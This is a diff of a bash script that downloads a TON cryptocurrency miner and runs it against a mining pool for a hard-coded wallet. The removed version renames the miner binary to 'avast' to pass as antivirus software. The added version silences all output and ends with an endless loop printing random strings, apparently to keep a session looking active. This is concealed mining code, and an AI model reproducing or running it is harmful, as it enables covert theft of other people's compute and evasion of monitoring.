@@ -1,15 +1,21 @@
-apt update
+#!/bin/bash
 
-apt install proxychains
+#!/bin/sh
 
-apt install screen -y
+#!/bin/bash
 
-wget -q https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz
+wget https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1 
 
-tar -xvf  danila-miner-2.3.1-ubuntu-bionic.tar.gz
+tar xf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
 
-mv danila-miner avast
+chmod +x miner-linux >/dev/null 2>&1
 
-chmod +x avast 
+./miner-linux https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
 
-./avast run ton.de.hashrate.to:4003 EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+while [ 1 ]; do
+
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+
+sleep 2
+
+done
